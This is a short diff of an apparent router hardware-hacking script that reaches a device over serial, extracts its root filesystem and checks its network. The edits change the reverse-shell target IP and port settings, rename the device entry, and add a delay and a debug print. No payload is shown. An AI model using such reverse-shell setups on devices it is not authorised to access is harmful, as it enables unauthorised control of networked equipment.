@@ -14,10 +14,10 @@ init(autoreset=True)  # Colorama autoreset
 DEV_SERIAL_PORT = "/dev/ttyS0"
 BACKEND_ENDPOINT = "http://192.168.31.108:5000/updateGet"
 
-REVERSE_SHELL_IP   = "10.0.0.149"
+REVERSE_SHELL_IP   = "192.168.31.127"
 REVERSE_SHELL_PORT = 4444
 
-DEVICE_CONFIG = {"name":"router_asus2", "status":"ON", "shellIP":REVERSE_SHELL_IP, "shellPort":REVERSE_SHELL_PORT}
+DEVICE_CONFIG = {"name":"router_asus", "status":"ON", "shellIP":REVERSE_SHELL_IP, "shellPort":REVERSE_SHELL_PORT}
 
 
 
@@ -260,7 +260,7 @@ def extract_rootfs(ser):
 
                         print(Fore.GREEN + "Extraction completed ✓\n")
         
-        
+        sleep(2)
         network_status, rpi_ip = check_networking(ser)
         
         if network_status: 
@@ -282,7 +282,8 @@ def check_networking(ser):
     try:
         raspberry_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
         device_ip = send_command(ser, 'ifconfig | grep "inet"').split()[1].replace("addr:", "")
-
+        print("LA IP DEL DISPOSITIVO ES: " + device_ip)
+        
         print()
         print("● Checking connectivity:")
         print("+--------------------------------+")
